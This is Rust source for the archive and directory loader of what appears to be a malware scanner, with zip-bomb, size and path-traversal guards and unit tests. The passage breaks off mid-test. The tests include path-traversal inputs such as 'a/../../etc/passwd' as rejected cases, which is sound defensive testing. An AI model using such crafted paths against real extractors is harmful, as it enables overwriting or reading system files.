//! Target loader: directory walk, archive extraction, file-kind detection.
//!
//! This module owns ALL filesystem I/O for the scanner.  Every other module
//! receives an already-loaded [`crate::engine::FileUnit`] slice and never
//! touches disk.
//!
//! # Safety limits enforced here
//!
//! | Limit                    | Guard                                    |
//! |--------------------------|------------------------------------------|
//! | Per-file size            | Skip + record warning; never `Err`       |
//! | Total file count         | `Err(LimitExceeded)` when hit            |
//! | Total extracted bytes    | `Err(LimitExceeded)` (zip-bomb guard)    |
//! | Archive recursion depth  | Skip at depth > `cfg.max_archive_depth`  |
//! | Symlink follows          | Controlled by `cfg.follow_symlinks`      |
//! | Path traversal           | Reject any entry containing `..` or abs |

use std::io::Read as _;
use std::path::{Component, Path};

use sha2::{Digest, Sha256};
use tracing::{debug, warn};

use crate::config::ScanConfig;
use crate::engine::{FileKind, FileUnit};
use crate::error::{AvError, AvResult};

// ── public return type ────────────────────────────────────────────────────────

/// Everything the scanner needs from a loaded target.
#[derive(Debug)]
pub struct LoadedTarget {
    /// All retained files, in no particular order.
    pub files: Vec<FileUnit>,
    /// The parsed top-level `package.json`, if any was found.
    pub package_json: Option<serde_json::Value>,
    /// Total raw bytes consumed (sum of `file.data.len()`).
    pub bytes_scanned: u64,
    /// Non-fatal problems (oversized files, skipped entries, parse errors).
    pub errors: Vec<String>,
}

// ── Loader ────────────────────────────────────────────────────────────────────

/// The loader builds a [`LoadedTarget`] from a path or raw bytes.
///
/// It is intentionally stateless — all mutable bookkeeping lives in the
/// private [`LoadState`] that is local to each `load*` call.
pub struct Loader;

impl Loader {
    /// Load a target from the filesystem.
    ///
    /// If `target` is a **directory**, walks it (respecting
    /// `cfg.follow_symlinks`).  If it is a **file**, treats it as a
    /// single file unless it looks like a recognized archive, in which
    /// case it is extracted.
    pub fn load(target: &Path, cfg: &ScanConfig) -> AvResult<LoadedTarget> {
        if !target.exists() {
            return Err(AvError::NotFound(target.display().to_string()));
        }

        let mut state = LoadState::new(cfg);

        if target.is_dir() {
            walk_directory(target, &mut state, cfg)?;
        } else {
            let data = read_bounded_file(target, cfg, &mut state.errors)?;
            if let Some(data) = data {
                let name = single_file_rel_path(target);
                state.ingest_bytes(&name, data, 0, cfg)?;
            }
        }

        Ok(state.finish())
    }

    /// Load a target from raw bytes (e.g. an in-memory download).
    ///
    /// `name` is used as the display name / path for the root entry.
    pub fn load_bytes(name: &str, bytes: &[u8], cfg: &ScanConfig) -> AvResult<LoadedTarget> {
        let mut state = LoadState::new(cfg);
        state.ingest_bytes(name, bytes.to_vec(), 0, cfg)?;
        Ok(state.finish())
    }
}

/// Derive a relative display path for a single-file scan target. Preserves
/// persistence-relevant parent directory segments (`Library/LaunchAgents/...`,
/// `.config/systemd/user/...`, `.config/autostart/...`, `.config/fish/...`,
/// `etc/cron.d/...`, etc.) so `PersistenceEngine` can classify single-file
/// targets accurately while ordinary files keep their basename.
fn single_file_rel_path(target: &Path) -> String {
    let parts: Vec<String> = target
        .components()
        .filter_map(|c| match c {
            Component::Normal(s) => Some(s.to_string_lossy().into_owned()),
            _ => None,
        })
        .collect();
    if parts.len() >= 2 {
        let joined_lower = parts.join("/").to_ascii_lowercase();
        for marker in [
            "library/launchagents/",
            "library/launchdaemons/",
            ".config/systemd/user/",
            "systemd/user/",
            ".config/autostart/",
            "autostart/",
            ".config/fish/",
            "fish/",
            "etc/profile.d/",
            "etc/cron",
            "var/spool/cron/",
        ] {
            if let Some(pos) = joined_lower.find(marker) {
                let full = parts.join("/");
                if let Some(rel) = full.get(pos..) {
                    return rel.to_owned();
                }
            }
        }
    }
    target
        .file_name()
        .map(|n| n.to_string_lossy().into_owned())
        .unwrap_or_else(|| "file".to_string())
}

// ── internal bookkeeping ──────────────────────────────────────────────────────

struct LoadState {
    files: Vec<FileUnit>,
    errors: Vec<String>,
    total_files: usize,
    extracted_bytes: u64,
    /// The package.json closest to the archive/dir root (smallest depth).
    package_json_depth: Option<(usize, serde_json::Value)>,
}

impl LoadState {
    fn new(_cfg: &ScanConfig) -> Self {
        Self {
            files: Vec::new(),
            errors: Vec::new(),
            total_files: 0,
            extracted_bytes: 0,
            package_json_depth: None,
        }
    }

    /// Top-level ingest: detects archive vs. plain file and dispatches.
    fn ingest_bytes(
        &mut self,
        rel_path: &str,
        data: Vec<u8>,
        depth: usize,
        cfg: &ScanConfig,
    ) -> AvResult<()> {
        // Archive detection by magic before extension check, because
        // tarballs-in-gzip do not always have the .tgz extension.
        if is_gzip_magic(&data) {
            if depth < cfg.max_archive_depth {
                return self.extract_tgz(rel_path, &data, depth + 1, cfg);
            } else {
                self.errors.push(format!(
                    "skipped nested archive '{}' (max depth {} reached)",
                    rel_path, cfg.max_archive_depth
                ));
                // Fall through and store as a plain file so the archive
                // engine can still flag it.
            }
        }

        if is_zip_magic(&data) {
            if depth < cfg.max_archive_depth {
                return self.extract_zip(rel_path, &data, depth + 1, cfg);
            } else {
                self.errors.push(format!(
                    "skipped nested archive '{}' (max depth {} reached)",
                    rel_path, cfg.max_archive_depth
                ));
            }
        }

        // Uncompressed tar (no gzip wrapper). Without this an untrusted `.tar`
        // is stored as one opaque `FileKind::Archive` blob that every content
        // engine skips — so malware simply re-wrapped in a plain tar scored
        // Clean. tar entries are read bounded by their (uncompressed) header
        // size, which is pre-checked against `max_file_size` in `extract_tar`.
        if is_tar_magic(&data) {
            if depth < cfg.max_archive_depth {
                return self.extract_tar(rel_path, &data, depth + 1, cfg);
            } else {
                self.errors.push(format!(
                    "skipped nested archive '{}' (max depth {} reached)",
                    rel_path, cfg.max_archive_depth
                ));
            }
        }

        self.push_file(rel_path, data, cfg)?;
        Ok(())
    }

    /// Add a plain (non-archive) file to the result set.
    fn push_file(&mut self, rel_path: &str, data: Vec<u8>, cfg: &ScanConfig) -> AvResult<()> {
        // File-count limit.
        if self.total_files >= cfg.max_total_files {
            return Err(AvError::LimitExceeded(format!(
                "file count limit {} reached (at '{}')",
                cfg.max_total_files, rel_path
            )));
        }

        // Byte accounting (for files extracted from archives; plain files on
        // disk have already been bounded by `read_bounded_file`).
        let file_len = data.len() as u64;
        self.extracted_bytes = self.extracted_bytes.saturating_add(file_len);
        if self.extracted_bytes > cfg.max_extracted_bytes {
            return Err(AvError::LimitExceeded(format!(
                "total extracted bytes limit {} exceeded (at '{}')",
                cfg.max_extracted_bytes, rel_path
            )));
        }

        // Transcode UTF-16 text to UTF-8 so the text engines can scan it. A
        // script saved as UTF-16 (e.g. a `.ps1` from a Windows editor) is ~50%
        // NUL bytes, so `looks_textual()` classifies it as binary and every text
        // engine skips it — the script otherwise scans Clean. Only confidently
        // UTF-16 text is transcoded (BOM or a strong alternating-NUL pattern);
        // native binaries have NULs on both byte parities and are left untouched.
        let data = maybe_transcode_utf16(&data).unwrap_or(data);

        let kind = detect_kind(rel_path, &data);
        let sha256 = hex_sha256(&data);

        debug!(path = rel_path, kind = ?kind, bytes = data.len(), "loaded file");

        // Track the shallowest package.json.
        if rel_path
            .rsplit('/')
            .next()
            .map(|n| n.eq_ignore_ascii_case("package.json"))
            .unwrap_or(false)
        {
            let depth = rel_path.chars().filter(|&c| c == '/').count();
            let is_better = self
                .package_json_depth
                .as_ref()
                .map(|(d, _)| depth < *d)
                .unwrap_or(true);
            if is_better {
                match serde_json::from_slice::<serde_json::Value>(&data) {
                    Ok(v) => {
                        self.package_json_depth = Some((depth, v));
                    }
                    Err(e) => {
                        self.errors
                            .push(format!("could not parse '{}' as JSON: {}", rel_path, e));
                    }
                }
            }
        }

        self.files.push(FileUnit {
            rel_path: rel_path.to_owned(),
            data,
            kind,
            sha256,
        });
        self.total_files += 1;
        Ok(())
    }

    /// Decompress gzip then parse as a tar archive.  Also handles plain `.gz`
    /// (single-file gzip) when no tar entries are found.
    fn extract_tgz(
        &mut self,
        archive_name: &str,
        compressed: &[u8],
        depth: usize,
        cfg: &ScanConfig,
    ) -> AvResult<()> {
        use flate2::read::GzDecoder;

        // Compute the remaining byte budget so we can abort the stream before
        // allocating more than allowed.  This is the critical guard against
        // gzip bombs: we must NOT call read_to_end on an unbounded decoder.
        let remaining_budget = cfg.max_extracted_bytes.saturating_sub(self.extracted_bytes);
        // Read at most (budget + 1) bytes.  If we fill the buffer exactly up to
        // budget+1 the limit was breached and we return an error; otherwise the
        // full decompressed content fits within the budget.
        let cap = remaining_budget.saturating_add(1) as usize;

        let decoder = GzDecoder::new(compressed);
        let mut decompressed = Vec::new();
        decoder
            .take(cap as u64)
            .read_to_end(&mut decompressed)
            .map_err(|e| {
                AvError::Archive(format!(
                    "gzip decompression of '{}' failed: {}",
                    archive_name, e
                ))
            })?;

        if decompressed.len() as u64 > remaining_budget {
            return Err(AvError::LimitExceeded(format!(
                "total extracted bytes limit {} exceeded while decompressing '{}'",
                cfg.max_extracted_bytes, archive_name
            )));
        }

        // Is the decompressed payload itself a tar?
        if is_tar_magic(&decompressed)
            || archive_name.ends_with(".tgz")
            || archive_name.ends_with(".tar.gz")
        {
            return self.extract_tar(archive_name, &decompressed, depth, cfg);
        }

        // Plain .gz single-file: strip the .gz suffix for the inner name.
        let inner_name = archive_name.strip_suffix(".gz").unwrap_or(archive_name);
        self.ingest_bytes(inner_name, decompressed, depth, cfg)
    }

    /// Parse and extract a tar archive from raw (already-decompressed) bytes.
    fn extract_tar(
        &mut self,
        archive_name: &str,
        tar_bytes: &[u8],
        depth: usize,
        cfg: &ScanConfig,
    ) -> AvResult<()> {
        use std::io::Cursor;
        use tar::Archive;

        let cursor = Cursor::new(tar_bytes);
        let mut archive = Archive::new(cursor);

        let entries = archive.entries().map_err(|e| {
            AvError::Archive(format!(
                "cannot read tar entries from '{}': {}",
                archive_name, e
            ))
        })?;

        for entry_result in entries {
            let mut entry = match entry_result {
                Ok(e) => e,
                Err(e) => {
                    self.errors
                        .push(format!("bad tar entry in '{}': {}", archive_name, e));
                    continue;
                }
            };

            // Only process regular files.
            let header = entry.header();
            if header.entry_type() != tar::EntryType::Regular
                && header.entry_type() != tar::EntryType::Continuous
            {
                continue;
            }

            let raw_path = match entry.path() {
                Ok(p) => p.to_string_lossy().into_owned(),
                Err(e) => {
                    self.errors.push(format!(
                        "tar entry with undecodable path in '{}': {}",
                        archive_name, e
                    ));
                    continue;
                }
            };

            // Path traversal guard.
            if !is_safe_archive_path(&raw_path) {
                self.errors.push(format!(
                    "rejected path-traversal tar entry '{}' in '{}'",
                    raw_path, archive_name
                ));
                continue;
            }

            // Per-entry size guard (before reading).
            let entry_size = entry.header().size().unwrap_or(0);
            if entry_size > cfg.max_file_size {
                self.errors.push(format!(
                    "skipped oversized tar entry '{}' in '{}' ({} bytes > limit {})",
                    raw_path, archive_name, entry_size, cfg.max_file_size
                ));
                continue;
            }

            // Bomb guard: pre-check claimed size against the remaining budget.
            let new_total = self.extracted_bytes.saturating_add(entry_size);
            if new_total > cfg.max_extracted_bytes {
                return Err(AvError::LimitExceeded(format!(
                    "total extracted bytes limit {} would be exceeded by '{}' in '{}' \
                     (entry claims {} bytes)",
                    cfg.max_extracted_bytes, raw_path, archive_name, entry_size
                )));
            }

            let mut data = Vec::new();
            if let Err(e) = entry.read_to_end(&mut data) {
                self.errors.push(format!(
                    "could not read tar entry '{}' in '{}': {}",
                    raw_path, archive_name, e
                ));
                continue;
            }

            // Guard again on actual bytes read (claimed size vs. reality).
            if data.len() as u64 > cfg.max_file_size {
                self.errors.push(format!(
                    "skipped tar entry '{}' in '{}': actual size {} exceeds limit {}",
                    raw_path,
                    archive_name,
                    data.len(),
                    cfg.max_file_size
                ));
                continue;
            }

            // Normalise to forward slashes.
            let rel = raw_path.replace('\\', "/");
            self.ingest_bytes(&rel, data, depth, cfg)?;
        }

        Ok(())
    }

    /// Extract a ZIP archive from raw bytes.
    fn extract_zip(
        &mut self,
        archive_name: &str,
        zip_bytes: &[u8],
        depth: usize,
        cfg: &ScanConfig,
    ) -> AvResult<()> {
        use std::io::Cursor;
        use zip::ZipArchive;

        let cursor = Cursor::new(zip_bytes);
        let mut archive = ZipArchive::new(cursor)
            .map_err(|e| AvError::Archive(format!("cannot open zip '{}': {}", archive_name, e)))?;

        for i in 0..archive.len() {
            let entry = match archive.by_index(i) {
                Ok(e) => e,
                Err(e) => {
                    self.errors
                        .push(format!("bad zip entry #{} in '{}': {}", i, archive_name, e));
                    continue;
                }
            };

            // Skip directories.
            if entry.is_dir() {
                continue;
            }

            // `zip` 9 returns `Result<Cow<str>, ZipError>` from `name()`
            // (the stored name may not be valid UTF-8).
            let raw_name = match entry.name() {
                Ok(name) => name.into_owned(),
                Err(e) => {
                    self.errors.push(format!(
                        "bad zip entry name #{} in '{}': {}",
                        i, archive_name, e
                    ));
                    continue;
                }
            };

            // Path traversal guard.
            if !is_safe_archive_path(&raw_name) {
                self.errors.push(format!(
                    "rejected path-traversal zip entry '{}' in '{}'",
                    raw_name, archive_name
                ));
                continue;
            }

            // Per-entry size guard (uncompressed size from the header).
            // Note: an attacker can falsify this field to 0 in the zip local
            // header. We use it as a fast pre-check only; actual enforcement
            // uses the real bytes read below.
            let uncompressed_size = entry.size();
            if uncompressed_size > cfg.max_file_size {
                self.errors.push(format!(
                    "skipped oversized zip entry '{}' in '{}' ({} bytes > limit {})",
                    raw_name, archive_name, uncompressed_size, cfg.max_file_size
                ));
                continue;
            }

            // Pre-check claimed size against the remaining budget (fast path;
            // does NOT catch falsified-zero-size headers — see post-read check).
            let new_total = self.extracted_bytes.saturating_add(uncompressed_size);
            if new_total > cfg.max_extracted_bytes {
                return Err(AvError::LimitExceeded(format!(
                    "total extracted bytes limit {} would be exceeded by '{}' in '{}' \
                     (entry claims {} uncompressed bytes)",
                    cfg.max_extracted_bytes, raw_name, archive_name, uncompressed_size
                )));
            }

            // Stream-read the entry, bounded by BOTH the remaining extracted-
            // bytes budget and the per-file size cap. The per-file bound is
            // load-bearing: a zip entry can advertise a tiny (or zero)
            // uncompressed size in the central directory while its deflate stream
            // expands to far more (verified: a falsified size of 0 still
            // decompresses the full stream), so without this cap a single crafted
            // entry would decompress up to the entire `max_extracted_bytes`
            // budget into memory regardless of `max_file_size`. `+ 1` on each so a
            // real overflow is still observable in the bytes we read.
            let budget_remaining = cfg
                .max_extracted_bytes
                .saturating_sub(self.extracted_bytes)
                .saturating_add(1);
            let read_cap = budget_remaining.min(cfg.max_file_size.saturating_add(1));
            let mut data = Vec::new();
            if let Err(e) = entry.take(read_cap).read_to_end(&mut data) {
                self.errors.push(format!(
                    "could not read zip entry '{}' in '{}': {}",
                    raw_name, archive_name, e
                ));
                continue;
            }
            let read_len = data.len() as u64;

            // Global budget guard: catches a falsified-small-size header whose
            // real deflate output fills the remaining budget.
            if read_len >= budget_remaining {
                return Err(AvError::LimitExceeded(format!(
                    "total extracted bytes limit {} exceeded by zip entry '{}' in '{}' \
                     (actual decompressed size at least {})",
                    cfg.max_extracted_bytes, raw_name, archive_name, read_len,
                )));
            }

            // Per-file size guard. An entry whose real decompressed size exceeds
            // the per-file cap is not retained, but the bytes we were forced to
            // decompress are still charged to the extracted-bytes budget — so a
            // flood of crafted oversize entries cannot evade the zip-bomb guard
            // by never being retained.
            if read_len > cfg.max_file_size {
                self.extracted_bytes = self.extracted_bytes.saturating_add(read_len);
                self.errors.push(format!(
                    "skipped zip entry '{}' in '{}': actual size {} exceeds limit {}",
                    raw_name, archive_name, read_len, cfg.max_file_size
                ));
                continue;
            }

            let rel = raw_name.replace('\\', "/");
            self.ingest_bytes(&rel, data, depth, cfg)?;
        }

        Ok(())
    }

    fn finish(self) -> LoadedTarget {
        let bytes_scanned = self.files.iter().map(|f| f.data.len() as u64).sum();
        LoadedTarget {
            files: self.files,
            package_json: self.package_json_depth.map(|(_, v)| v),
            bytes_scanned,
            errors: self.errors,
        }
    }
}

// ── directory walker ──────────────────────────────────────────────────────────

fn walk_directory(root: &Path, state: &mut LoadState, cfg: &ScanConfig) -> AvResult<()> {
    use walkdir::WalkDir;

    let walker = WalkDir::new(root)
        .follow_links(cfg.follow_symlinks)
        .same_file_system(false);

    for entry_result in walker {
        let entry = match entry_result {
            Ok(e) => e,
            Err(e) => {
                state.errors.push(format!("walkdir error: {}", e));
                continue;
            }
        };

        if !entry.file_type().is_file() {
            continue;
        }

        // Skip .git directories entirely — they contain objects that look
        // suspicious (packed objects with binary data, ORIG_HEAD with hashes)
        // and are never part of what we want to scan.
        let path = entry.path();
        if path
            .components()
            .any(|c| c == Component::Normal(".git".as_ref()))
        {
            continue;
        }

        // Relative path from root, using forward slashes.
        let rel = match path.strip_prefix(root) {
            Ok(r) => r.to_string_lossy().replace('\\', "/"),
            Err(_) => path.to_string_lossy().replace('\\', "/"),
        };

        let data = match read_bounded_file(path, cfg, &mut state.errors) {
            Ok(Some(d)) => d,
            Ok(None) => continue, // over-size, recorded as warning
            Err(e) => {
                state
                    .errors
                    .push(format!("could not read '{}': {}", rel, e));
                continue;
            }
        };

        state.ingest_bytes(&rel, data, 0, cfg)?;
    }

    Ok(())
}

// ── helpers ───────────────────────────────────────────────────────────────────

/// Read a file from disk, returning `None` (and recording a warning) if it
/// exceeds `cfg.max_file_size`.
fn read_bounded_file(
    path: &Path,
    cfg: &ScanConfig,
    errors: &mut Vec<String>,
) -> AvResult<Option<Vec<u8>>> {
    let meta = std::fs::metadata(path)?;
    if meta.len() > cfg.max_file_size {
        warn!(
            path = %path.display(),
            size = meta.len(),
            limit = cfg.max_file_size,
            "skipping oversized file"
        );
        errors.push(format!(
            "skipped '{}': {} bytes exceeds max_file_size {}",
            path.display(),
            meta.len(),
            cfg.max_file_size
        ));
        return Ok(None);
    }
    let data = std::fs::read(path)?;
    Ok(Some(data))
}

/// If `data` is UTF-16 (LE or BE) encoded text, transcode it to UTF-8 and
/// return the UTF-8 bytes; otherwise return `None` (the caller keeps the
/// original bytes). Detection is by BOM (`FF FE` / `FE FF`) or, absent a BOM, a
/// strong alternating-NUL pattern characteristic of UTF-16-encoded ASCII/Latin
/// text. Real native binaries have NULs scattered across BOTH byte parities, so
/// they never match the alternating pattern and are left untouched.
fn maybe_transcode_utf16(data: &[u8]) -> Option<Vec<u8>> {
    if data.len() < 4 {
        return None;
    }
    let (little_endian, body): (bool, &[u8]) = match (data[0], data[1]) {
        (0xFF, 0xFE) => (true, &data[2..]),
        (0xFE, 0xFF) => (false, &data[2..]),
        // No BOM: infer endianness from the alternating-NUL pattern.
        _ => (detect_utf16_no_bom(data)?, data),
    };
    if body.len() < 2 {
        return None;
    }
    let units = body.len() / 2;
    let mut u16s: Vec<u16> = Vec::with_capacity(units);
    for i in 0..units {
        let a = body[2 * i];
        let b = body[2 * i + 1];
        let unit = if little_endian {
            u16::from_le_bytes([a, b])
        } else {
            u16::from_be_bytes([a, b])
        };
        u16s.push(unit);
    }
    // Lossy decode: invalid surrogate pairs become U+FFFD rather than failing —
    // a scanner must degrade to scanning the recoverable text, never bail out.
    let mut s: String = char::decode_utf16(u16s)
        .map(|r| r.unwrap_or('\u{FFFD}'))
        .collect();
    // Strip a leading BOM code point left by a no-BOM/BE decode.
    if s.starts_with('\u{FEFF}') {
        s.remove(0);
    }
    Some(s.into_bytes())
}

/// Heuristic UTF-16 detection without a BOM: over a bounded probe, one byte
/// parity must be almost entirely NUL (the high byte of ASCII/Latin code units)
/// while the other parity is almost entirely non-NUL (the payload). Returns
/// `Some(true)` for little-endian (NULs on odd offsets), `Some(false)` for
/// big-endian (NULs on even offsets), or `None` when the pattern is absent
/// (plain UTF-8 / a real binary).
fn detect_utf16_no_bom(data: &[u8]) -> Option<bool> {
    let probe = &data[..data.len().min(2048)];
    let n = probe.len() - (probe.len() % 2);
    if n < 16 {
        return None;
    }
    let mut even_nul = 0usize; // NULs at offsets 0,2,4,…
    let mut odd_nul = 0usize; // NULs at offsets 1,3,5,…
    for (i, &byte) in probe[..n].iter().enumerate() {
        if byte == 0 {
            if i % 2 == 0 {
                even_nul += 1;
            } else {
                odd_nul += 1;
            }
        }
    }
    let pairs = n / 2;
    // Little-endian ASCII text: NUL on ~every odd offset, ~none on even offsets.
    if odd_nul * 100 >= pairs * 90 && even_nul * 100 <= pairs * 10 {
        return Some(true);
    }
    // Big-endian: the mirror.
    if even_nul * 100 >= pairs * 90 && odd_nul * 100 <= pairs * 10 {
        return Some(false);
    }
    None
}

/// SHA-256 digest of `data` as a lowercase hex string.
fn hex_sha256(data: &[u8]) -> String {
    let mut h = Sha256::new();
    h.update(data);
    hex::encode(h.finalize())
}

// ── archive-format detection ──────────────────────────────────────────────────

/// gzip magic bytes: 0x1F 0x8B.
#[inline]
fn is_gzip_magic(data: &[u8]) -> bool {
    data.len() >= 2 && data[0] == 0x1F && data[1] == 0x8B
}

/// ZIP magic bytes: 'P' 'K' 0x03 0x04 (local file header signature).
/// Also accept the end-of-central-directory signature so empty zips are
/// recognised, but we only extract from files that start with a local header.
#[inline]
fn is_zip_magic(data: &[u8]) -> bool {
    data.len() >= 4
        && data[0] == b'P'
        && data[1] == b'K'
        && (data[2] == 0x03 || data[2] == 0x05 || data[2] == 0x07)
}

/// Heuristic: does the buffer look like a tar archive?
///
/// A tar header has 512-byte blocks; the magic "ustar" or "ustar  " lives
/// at byte offset 257 in the first block.
#[inline]
fn is_tar_magic(data: &[u8]) -> bool {
    if data.len() < 265 {
        return false;
    }
    let magic = &data[257..262];
    // POSIX ustar magic (bytes 257-261); both the null-terminated POSIX and
    // space-padded GNU variants share these 5 bytes.
    magic == b"ustar"
}

/// Guard against path traversal within archive entries.
///
/// Rejects paths that:
/// - Are absolute (`/` or `C:\`-style).
/// - Contain `..` components.
fn is_safe_archive_path(path: &str) -> bool {
    if path.starts_with('/') {
        return false;
    }
    // Windows absolute path: starts with a drive letter + colon.
    if path.len() >= 2 && path.as_bytes()[1] == b':' {
        return false;
    }
    // Component-level `..` check — handle both `/` and `\` separators.
    for component in path.split(['/', '\\']) {
        if component == ".." {
            return false;
        }
    }
    true
}

// ── file-kind detection ───────────────────────────────────────────────────────

/// Identify the [`FileKind`] of a file from its content and path.
///
/// Magic bytes take precedence over extension so that renamed binaries are
/// still classified correctly.
fn detect_kind(rel_path: &str, data: &[u8]) -> FileKind {
    // Magic-byte checks first.
    if data.len() >= 4 {
        let magic4 = &data[..4];
        // ELF: \x7fELF
        if magic4 == b"\x7fELF" {
            return FileKind::ElfBinary;
        }
        // PE: MZ
        if magic4[..2] == *b"MZ" {
            return FileKind::PeBinary;
        }
        // Mach-O: 0xFEEDFACE (BE 32-bit), 0xCEFAEDFE (LE 32-bit),
        //         0xFEEDFACF (BE 64-bit), 0xCFFAEDFE (LE 64-bit).
        if magic4 == b"\xFE\xED\xFA\xCE"
            || magic4 == b"\xCE\xFA\xED\xFE"
            || magic4 == b"\xFE\xED\xFA\xCF"
            || magic4 == b"\xCF\xFA\xED\xFE"
        {
            return FileKind::MachoBinary;
        }
        // WebAssembly: \0asm
        if magic4 == b"\x00asm" {
            return FileKind::Wasm;
        }
        // Mach-O fat binary: 0xCAFEBABE (BE) / 0xBEBAFECA (LE).
        if magic4 == b"\xCA\xFE\xBA\xBE" || magic4 == b"\xBE\xBA\xFE\xCA" {
            return FileKind::MachoBinary;
        }
    }

    // Extension-based classification (case-insensitive, covers most cases).
    let name_lower = rel_path
        .rsplit('/')
        .next()
        .unwrap_or(rel_path)
        .to_ascii_lowercase();

    // Exact-name manifest files.
    if matches!(
        name_lower.as_str(),
        "package.json"
            | "pyproject.toml"
            | "setup.py"
            | "setup.cfg"
            | "cargo.toml"
            | "go.mod"
            | "composer.json"
            | "gemfile"
            | "requirements.txt"
            | "pipfile"
            | "poetry.lock"
            | "package-lock.json"
            | "yarn.lock"
            | "pnpm-lock.yaml"
            | "npm-shrinkwrap.json"
    ) {
        return FileKind::Manifest;
    }

    // Extension matching.
    let ext = name_lower.rsplit('.').next().unwrap_or("");
    match ext {
        "js" | "cjs" | "mjs" => FileKind::Javascript,
        "ts" | "tsx" => FileKind::TypeScript,
        "py" | "pyw" => FileKind::Python,
        "sh" | "bash" | "zsh" | "ksh" | "ash" | "dash" => FileKind::Shell,
        "ps1" | "psm1" | "psd1" => FileKind::PowerShell,
        "rb" | "rake" | "gemspec" => FileKind::Ruby,
        "php" | "phtml" | "php3" | "php4" | "php5" | "php7" | "phps" => FileKind::Php,
        "html" | "htm" | "xhtml" => FileKind::Html,
        "wasm" => FileKind::Wasm,
        "json" | "jsonc" => FileKind::Json,
        "tar" => FileKind::Archive,
        "gz" | "tgz" | "bz2" | "xz" | "zip" | "7z" | "rar" => FileKind::Archive,
        _ => {
            // Printable-text heuristic: if no NUL bytes in the first 8 KiB,
            // treat as generic Text rather than Unknown.
            let probe = &data[..data.len().min(8192)];
            if probe.is_empty() || !probe.contains(&0) {
                FileKind::Text
            } else {
                FileKind::Unknown
            }
        }
    }
}

// ── tests ─────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    // ── helpers ──────────────────────────────────────────────────────────────

    fn default_cfg() -> ScanConfig {
        ScanConfig::default()
    }

    fn tight_cfg() -> ScanConfig {
        ScanConfig {
            max_file_size: 1024,
            max_total_files: 5,
            max_archive_depth: 2,
            max_extracted_bytes: 4096,
            ..ScanConfig::default()
        }
    }

    // ── path traversal ───────────────────────────────────────────────────────

    #[test]
    fn safe_path_ok() {
        // These are safe.
        assert!(is_safe_archive_path("foo/bar/baz.js"));
        assert!(is_safe_archive_path("package.json"));
        assert!(is_safe_archive_path("node_modules/foo/index.js"));
        assert!(is_safe_archive_path("dist/bundle.cjs"));
        // These must be rejected.
        assert!(!is_safe_archive_path("a/b/../c"));
        assert!(!is_safe_archive_path("../escape"));
        assert!(!is_safe_archive_path("/absolute/path"));
        assert!(!is_safe_archive_path("C:\\windows\\system32"));
        assert!(!is_safe_archive_path(".."));
        assert!(!is_safe_archive_path("a/../../etc/passwd"));
    }

    // ── file-kind detection ──────────────────────────────────────────────────

    #[test]
    fn kind_elf_by_magic() {
        let data = b"\x7fELF\x01\x01\x01\x00more-bytes";
        assert_eq!(detect_kind("some-binary", data), FileKind::ElfBinary);
    }

    #[test]
    fn kind_pe_by_magic() {
        let mut data = vec![b'M', b'Z'];
        data.extend_from_slice(&[0u8; 32]);
        assert_eq!(detect_kind("program.exe", &data), FileKind::PeBinary);
    }

    #[test]
    fn kind_macho_le32() {
        let data = b"\xCE\xFA\xED\xFE\x00\x00\x00\x00";
        assert_eq!(detect_kind("libfoo.dylib", data), FileKind::MachoBinary);
    }

    #[test]
    fn kind_macho_cafe_babe() {
        let data = b"\xCA\xFE\xBA\xBE\x00\x00\x00\x02";
        assert_eq!(detect_kind("fatbin", data), FileKind::MachoBinary);
    }

    #[test]
    fn kind_wasm_by_magic() {
        let data = b"\x00asm\x01\x00\x00\x00";
        assert_eq!(detect_kind("module.wasm", data), FileKind::Wasm);
    }

    #[test]
    fn kind_wasm_by_extension() {
        let data = b"(module)"; // textual wasm, no magic
        assert_eq!(detect_kind("module.wasm", data), FileKind::Wasm);
    }

    #[test]
    fn kind_js_extensions() {
        let data = b"console.log('hi')";
        assert_eq!(detect_kind("index.js", data), FileKind::Javascript);
        assert_eq!(detect_kind("entry.cjs", data), FileKind::Javascript);
        assert_eq!(detect_kind("mod.mjs", data), FileKind::Javascript);
    }

    #[test]
    fn kind_typescript() {
        let data = b"const x: number = 1;";
        assert_eq!(detect_kind("app.ts", data), FileKind::TypeScript);
        assert_eq!(detect_kind("comp.tsx", data), FileKind::TypeScript);
    }

    #[test]
    fn kind_python() {
        let data = b"import os\n";
        assert_eq!(detect_kind("main.py", data), FileKind::Python);
    }

    #[test]
    fn kind_shell() {
        let data = b"#!/bin/bash\n";
        assert_eq!(detect_kind("install.sh", data), FileKind::Shell);
        assert_eq!(detect_kind("setup.bash", data), FileKind::Shell);
    }

    #[test]
    fn kind_powershell() {
        let data = b"Write-Host 'hello'";
        assert_eq!(detect_kind("deploy.ps1", data), FileKind::PowerShell);
    }

    #[test]
    fn kind_ruby() {
        let data = b"puts 'hello'";
        assert_eq!(detect_kind("script.rb", data), FileKind::Ruby);
    }

    #[test]
    fn kind_php() {
        let data = b"<?php echo 'hi'; ?>";
        assert_eq!(detect_kind("index.php", data), FileKind::Php);
    }

    #[test]
    fn kind_manifest_package_json() {
        let data = b"{}";
        assert_eq!(detect_kind("package.json", data), FileKind::Manifest);
        // Nested path still detected.
        assert_eq!(detect_kind("pkg/package.json", data), FileKind::Manifest);
    }

    #[test]
    fn kind_manifest_pyproject() {
        let data = b"[tool.poetry]\n";
        assert_eq!(detect_kind("pyproject.toml", data), FileKind::Manifest);
    }

    #[test]
    fn kind_json_generic() {
        let data = b"{\"key\": 1}";
        // "config.json" must not be Manifest.
        assert_eq!(detect_kind("config.json", data), FileKind::Json);
    }

    #[test]
    fn kind_html() {
        let data = b"<!DOCTYPE html><html></html>";
        assert_eq!(detect_kind("index.html", data), FileKind::Html);
    }

    #[test]
    fn kind_text_fallback() {
        let data = b"just some text without a known extension";
        assert_eq!(detect_kind("notes.txt", data), FileKind::Text);
        assert_eq!(detect_kind("unknown_ext.xyz", data), FileKind::Text);
    }

    #[test]
    fn kind_unknown_binary() {
        // Data with NUL bytes and no recognised magic.
        let data = b"\x00\x01\x02\x03some binary garbage";
        assert_eq!(detect_kind("strange.bin", data), FileKind::Unknown);
    }

    // Magic takes precedence over extension.
    #[test]
    fn magic_beats_extension() {
        // An ELF file named ".js" should still be ElfBinary.
        let data = b"\x7fELF\x02\x01\x01\x00padding";
        assert_eq!(detect_kind("disguised.js", data), FileKind::ElfBinary);
    }

    // ── SHA-256 ──────────────────────────────────────────────────────────────

    #[test]
    fn sha256_stable_known_vector() {
        // echo -n '' | sha256sum == e3b0c44...
        let digest = hex_sha256(b"");
        assert_eq!(
            digest,
